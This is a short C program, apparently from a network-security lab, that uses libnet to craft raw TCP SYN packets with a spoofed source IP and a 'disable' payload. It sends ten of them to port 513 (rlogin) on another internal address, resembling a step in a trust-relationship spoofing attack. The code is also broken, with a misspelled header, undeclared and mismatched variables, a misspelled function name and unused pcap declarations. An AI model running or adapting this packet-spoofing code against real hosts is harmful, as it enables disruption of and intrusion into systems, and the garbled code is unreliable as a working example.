#include <stdio.h>
#include <pcap.h>
#include <libnet.h>
#include <stblib.h>

pcap_t *pcap_open_live(const char *device, int snaplen, int promisc, int to_ms, char *errbuf);
u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h);
int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user);
void callback_function(u_char *arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
int pcap_compile(pcap_t *p, struct bpf_program *fp, const char *str, int optimize, bpf_u_int32 mask);
int pcap_setfilter(pcap_t *p, struct bpf_program *fp);

char errorbuffer[PCAP_ERRBUF_SIZE];

void my_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* 
    packet) 
{ 
    static int count = 1; 
    fprintf(stdout, "%3d, ", count);
    fflush(stdout);
    count++; 
}

int main(int argc, char *argv[])
	{
		char *args = argv[1];
        char disablepayload[] = "disable";
		printf("%s", args);
        libentinit = libnet_init(LIBNET_RAW4,"eth0",errorbuffer);

        source = libnet_name2addr4(l,"130.37.198.122",LIBNET_DONT_RESOLVE);
        destination = libnet_name2addr4(l,"172.16.8.3",LIBNET_DONT_RESOLVE);

        libnet_seed_prand(libentinit);

        printf("Sending disable payload \n");
        build_tcp = libnet_build_tcp(888,513,libnet_get_prand(LIBNET_PRu32),libnet_get_prand(LIBNET_PRu32),TH_SYN,libnet_get_prand(LIBNET_PRu16),0, 0,LIBNET_TCP_H + strlen(disablepayload),
		(uint8_t *)disablepayload,strlen(disablepayload),l,0);

        build_ip  = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H  + strlen(disablepayload),0,242,0,64,IPPROTO_TCP,0,ip_src,ip_dst,NULL,0,l,0);

	
	for(int i=0 ; i < 10 ; i ++ ) {
	
	build_tcp = llibnet_build_tcp(888,513,libnet_get_prand(LIBNET_PRu32),libnet_get_prand(LIBNET_PRu32),TH_SYN,libnet_get_prand(LIBNET_PRu16),0, 0,LIBNET_TCP_H + strlen(disablepayload),
		(uint8_t *)disablepayload,strlen(disablepayload),l,build_tcp);

	printf("Disable:Number of bytes written %d \n ",libnet_write(l));

	}
		return(0);
	}
